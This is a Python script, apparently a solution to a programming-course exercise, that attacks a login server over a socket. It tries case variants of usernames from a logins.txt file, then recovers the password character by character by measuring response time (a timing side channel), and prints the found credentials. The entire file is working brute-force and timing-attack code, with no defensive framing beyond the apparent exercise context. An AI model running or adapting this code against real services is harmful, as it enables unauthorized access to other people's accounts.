# write your code here
import random
import socket
import json
import sys
import string
import itertools
import time
from os import path


def possible_combinations(password):
    return map(
        lambda x: ''.join(x),
        itertools.product(*([letter.lower(), letter.upper()] for letter in password))
    )


def send_to_server(connector, data):
    start = time.time()
    connector.sendall(bytes(json.dumps(data), encoding="utf-8"))
    response = connector.recv(1024).decode(encoding='utf8')
    end = time.time()

    try:
        return json.loads(response), (end - start)
    except Exception:
        return response, (end - start)


class Hacker:
    def __init__(self):
        # command parser
        arguments = sys.argv
        self.chars = list(string.ascii_letters + string.digits)
        self.iterator = iter(self.chars)
        self.address = (arguments[1], int(arguments[2]))
        self.char_container = string.ascii_lowercase + string.digits

    def combinations(self, length):
        """Tries to generate different combinations of letters and digits

        # Arguments:
            length: how long is the password string

        # Returns:
            possible password string
        """
        if length <= 0:
            return

        for char in self.chars:
            if len(char) <= length:
                yield char

            for prev in self.combinations(length - len(char)):
                yield char + prev

    def get_next_char(self, concat):
        char = next(self.iterator, 'end')

        if char == 'end':
            self.iterator = iter(self.chars)
            return self.get_next_char(concat)

        return concat + char

    def process(self):
        """Processing all the steps for the first stage"""

        # Context manager for opening and closing connection
        with socket.socket() as connector:
            connector.connect(self.address)

            with open(path.join(path.dirname(path.abspath(__file__)), 'logins.txt'), 'r') as file:
                for line in file.readlines():
                    char = ''
                    for login in possible_combinations(line.strip()):
                        response = send_to_server(connector, {
                            "login": login,
                            "password": char
                        })[0]

                        if response['result'] == 'Wrong password!':
                            while True:
                                password = self.get_next_char(char)
                                response = send_to_server(connector, {
                                    "login": login,
                                    "password": password
                                })

                                spent_time = response[1]
                                response = response[0]

                                if spent_time >= 0.1:
                                    char = password
                                elif type(response) == dict and response['result'] == "Connection success!":
                                    return json.dumps({
                                        "login": login,
                                        "password": password
                                    })

        return None


# This will make sure if the file is running independently
if __name__ == '__main__':
    hack = Hacker()
    value = hack.process()

    if value is not None:
        print(value)
